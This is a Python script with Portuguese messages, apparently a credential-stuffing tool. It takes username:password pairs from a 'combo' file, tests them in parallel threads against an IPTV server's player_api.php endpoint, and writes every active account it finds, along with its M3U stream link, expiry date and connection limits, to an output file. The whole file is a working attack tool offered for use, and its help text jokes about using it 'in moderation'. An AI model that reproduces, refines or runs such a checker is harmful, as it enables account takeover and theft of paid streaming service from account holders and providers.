# -*- coding: utf-8 -*-
import http.client
from urllib.parse import urlparse
import json as json_
import argparse
import concurrent.futures
from datetime import datetime
import sys
import os

dir_path = os.path.dirname(os.path.realpath(__file__))

class HTTP(object):
    def __init__(self, url, headers=None):
        self.url = url
        self.headers = headers if headers else {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0'}
        self.text = ''
        self.content = b''
        self.status_code = 0

    def send_request(self, method, url, headers=None, max_redirects=5):
        if headers is None:
            headers = {}

        parsed_url = urlparse(url)
        host = parsed_url.hostname
        path = parsed_url.path
        port = parsed_url.port
        if not path:
            path = '/'
        gets = parsed_url.query
        path = path + '?' + gets
        conn = None
        try:
            if parsed_url.scheme == 'https':
                conn = http.client.HTTPSConnection(host,timeout=5)
            else:
                if port:
                    conn = http.client.HTTPConnection(host,port=port,timeout=5)
                else:
                    conn = http.client.HTTPConnection(host,timeout=5)

            conn.request(method, path, headers=headers)
            response = conn.getresponse()
            self.status_code = response.status

            # Handling redirects
            if 300 <= response.status < 400 and 'Location' in response.getheaders() and max_redirects > 0:
                new_location = response.getheader('Location')
                conn.close()
                return self.send_request(method, new_location, headers, max_redirects - 1)

            self.content = response.read()
            self.text = self.content.decode()
            conn.close()
        except Exception as e:
            pass

        return self
    
    def json(self):
        try:
            return json_.loads(self.content)
        except:
            return {}

    @staticmethod
    def get(url, headers=None):
        instance = HTTP(url, headers)
        instance.send_request('GET', instance.url, instance.headers)
        return instance

def get_info_iptv(host,username,password):
    parsed_url = urlparse(host)
    protocolo = parsed_url.scheme
    host = parsed_url.netloc
    porta = parsed_url.port
    result = {}
    try:
        host = host.split(':')[0]
    except:
        pass
    if porta:
        host_ = f'{protocolo}://{host}:{porta}'
        api = f'{protocolo}://{host}:{porta}/player_api.php?username={username}&password={password}'
        m3u = f'{protocolo}://{host}:{porta}/get.php?username={username}&password={password}&type=m3u_plus&output=m3u8'
    else:
        host_ = f'{protocolo}://{host}'
        api = f'{protocolo}://{host}/player_api.php?username={username}&password={password}'
        m3u = f'{protocolo}://{host}/get.php?username={username}&password={password}&type=m3u_plus&output=m3u8'
    d = HTTP.get(api).json()
    if d:
        status = d['user_info']['status']
        if status == 'Active':
            status = 'Ativo'
            ok = True
        elif status == 'Trial':
            status = 'Teste'
            ok = False
        if ok:
            result['host'] = host_
            result['usuario'] = username
            result['senha'] = password            
            result['status'] = status
        expiry = d['user_info']['exp_date']
        try:
            created = d['user_info']['created_at']
            created = datetime.fromtimestamp(int(created)).strftime('%d/%m/%Y - %H:%M')
        except:
            created = ''
        if ok:
            result['criado_em'] = created
            if not expiry:
                result['vencimento'] = 'Ilimitado'
            else:
                expiry = datetime.fromtimestamp(int(expiry)).strftime('%d/%m/%Y - %H:%M')
                result['vencimento'] = expiry
        max_connection = str(d['user_info']['max_connections'])
        if max_connection == 'None':
            max_connection = 'Ilimitado'
        if ok:
            result['conexoes_permitidas'] = max_connection
            result['conexoes_ativas'] = str(d['user_info']['active_cons'])
            result['m3u'] = m3u
    if result:
        lista_strings = [f'{chave}: {valor}' for chave, valor in result.items()]
        final = '\n'.join(lista_strings)
    else:
        final = ''
    return final

def thread_iptv(f,host,username,password):
    result = get_info_iptv(host,username,password)
    if result:
        parsed_url = urlparse(host)
        protocolo = parsed_url.scheme
        host = parsed_url.netloc
        porta = parsed_url.port
        try:
            host = host.split(':')[0]
        except:
            pass        
        if porta:
            host_ = f'{protocolo}://{host}:{porta}'
        else:
            host_ = f'{protocolo}://{host}'
        try:
            msg = f'###################\nhost: {host_}\nusername: {username}\npassword: {password}\n##################\n'
            print(msg)
        except:
            pass
        final = '###################\n'
        final += result
        final += '\n'
        final += '##################\n'
        f.write(final)
        f.flush()
    

def check_and_save(host, combo, output, bots):
    if not os.path.exists(combo):
        combo = os.path.join(dir_path, combo)
    if os.path.exists(combo):
        with open(output, 'a', encoding='utf8') as f:
            with open(combo, 'r', encoding='utf8') as fc:
                with concurrent.futures.ThreadPoolExecutor(max_workers=int(bots)) as executor:
                    for line in fc.readlines():
                        line = line.replace('\n', '').replace('\r', '').replace(' ', '').replace('\ufeff', '')
                        if ':' in line:
                            try:
                                username = line.split(':')[0]
                            except:
                                username = False
                            try:
                                password = line.split(':')[1]
                            except:
                                password = False
                            if username and password:
                                username = str(username)
                                password = str(password)
                                executor.submit(thread_iptv, f, host, username, password)
    else:
        print('O caminho: %s nao existe'%combo)               
                    


def main():
    parser = argparse.ArgumentParser(description='Scan iptv, use com moderação kkk')
    parser.add_argument('-H', '--host', help='Host', required=True)
    parser.add_argument('-C', '--combo', help='Caminho para o arquivo combo.txt', required=True)
    parser.add_argument('-O', '--output', help='Caminho para o arquivo de saída output.txt', required=True)
    parser.add_argument('-B', '--bots', help='Numero de bots em execução ex: 5', type=int, required=True)
    
    args = parser.parse_args()

    host = args.host
    combo = args.combo
    output = args.output
    bots = args.bots

    if host and combo and output and bots:        
        try:
            print('Scan de lista iptv iniciado...')
            check_and_save(host,combo,output,int(bots))
        except KeyboardInterrupt:
            print("\nTecla Ctrl+C pressionada. Encerrando o programa...")
            sys.exit(0)  # Sai do programa com status de sucesso
        finally:
            print('Scan de listas concluido')
    else:
        print('informacao invalida')

  

if __name__ == "__main__":
    main() 
      
